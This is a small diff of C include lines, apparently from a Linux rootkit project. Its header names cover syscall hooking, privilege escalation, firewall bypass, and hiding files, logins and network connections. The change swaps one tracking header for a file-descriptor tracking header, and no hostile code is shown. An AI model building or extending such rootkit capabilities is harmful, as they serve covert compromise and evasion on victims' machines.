@@ -13,7 +13,6 @@
 #include "hooking/syscall.h"
 #include "hooking/func.h"
 #include "capabilities/privilege.h"
-#include "capabilities/tracking.h"
 #include "capabilities/unloading.h"
 #include "capabilities/fw_bypass.h"
 #include "capabilities/hiding/dentry.h"
@@ -21,6 +20,7 @@
 #include "capabilities/hiding/login.h"
 #include "capabilities/hiding/net.h"
 #include "capabilities/tracking/process.h"
+#include "capabilities/tracking/fd.h"
 #include "utils.h"
 #include "config.h"
 
